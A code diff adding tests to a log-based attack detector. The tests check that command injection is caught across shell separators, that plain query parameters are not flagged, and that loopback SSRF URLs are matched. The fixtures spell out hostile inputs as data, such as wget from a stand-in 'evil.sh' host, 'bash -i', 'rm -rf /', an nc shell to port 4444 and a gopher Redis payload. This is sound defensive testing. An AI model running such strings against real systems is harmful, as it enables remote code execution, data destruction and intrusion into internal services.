@@ -39,6 +39,7 @@ from app.core.features.aggregator import WindowAggregator
 from app.core.features.encoder import encode_for_inference
 from app.core.features.extractor import extract_request_features
 from app.core.features.mappings import FEATURE_ORDER, METHOD_MAP, STATUS_CLASS_MAP
+from app.core.features.patterns import SSRF
 from app.core.ingestion.parsers import ParsedLogEntry
 
 FEATURE_KEYS = {
@@ -243,6 +244,83 @@ def test_attack_pattern_detection() -> None:
 
     clean = extract_request_features(_make_entry(path="/api/v1/health"))
     assert clean["has_attack_pattern"] is False
+
+
+def test_command_injection_detected_across_separators() -> None:
+    """
+    The same command is detected whichever shell separator introduces
+    it.
+
+    Every separator reaches the same interpreter, so "x|wget evil" is
+    the identical attack to "x;wget evil" and must not depend on which
+    per-separator command list a word happened to appear in.
+    """
+    for separator in (";", "|", "||", "&&"):
+        for command in ("wget http://evil.sh", "bash -i", "id",
+                        "rm -rf /", "nc 10.0.0.1 4444", "whoami"):
+            entry = _make_entry(
+                path="/run",
+                query_string=f"arg=x{separator}{command}")
+            features = extract_request_features(entry)
+            assert features["has_attack_pattern"] is True, (
+                f"missed {separator}{command}")
+
+
+def test_query_parameters_are_not_command_injection() -> None:
+    """
+    A single "&" separates query parameters and must not be read as a
+    shell separator.
+
+    "?a=1&id=5" contains "&" followed by a real command name, so a
+    separator class that included bare "&" would flag ordinary traffic.
+    """
+    benign = (
+        "id=5&name=bob",
+        "status=open&ip=1.2.3.4",
+        "cmd=list&set=default",
+        "file=report.pdf&env=staging",
+    )
+    for query_string in benign:
+        entry = _make_entry(path="/api/v1/items",
+                            query_string=query_string)
+        features = extract_request_features(entry)
+        assert features["has_attack_pattern"] is False, (
+            f"false positive on {query_string}")
+
+
+def test_ssrf_loopback_detected_without_trailing_path() -> None:
+    """
+    A scheme is enough to establish URL context for loopback SSRF.
+
+    Requiring a trailing path missed "http://localhost:6379", which is
+    the usual Redis SSRF target and carries no path at all.
+
+    Asserted against SSRF directly rather than has_attack_pattern: a
+    parameter named "url" also matches the open-redirect rule, which
+    would let this pass without the SSRF rule firing at all.
+    """
+    targets = (
+        "http://127.0.0.1:8080",
+        "http://localhost:6379",
+        "http://127.0.0.1",
+        "http://0.0.0.0:9200",
+        "gopher://localhost:6379/_SET",
+        "http://127.0.0.1/admin",
+    )
+    for target in targets:
+        assert SSRF.search(f"/fetch?webhook={target}"), (
+            f"missed {target}")
+
+
+def test_ssrf_does_not_flag_ordinary_hosts() -> None:
+    """
+    Loopback detection must not extend to unrelated external hosts.
+    """
+    for target in ("https://api.example.com/v1/hook",
+                   "https://cdn.jsdelivr.net/npm/x.js",
+                   "http://192.168.1.10"):
+        assert not SSRF.search(f"/fetch?webhook={target}"), (
+            f"false positive on {target}")
 
 
 def test_special_char_ratio() -> None:
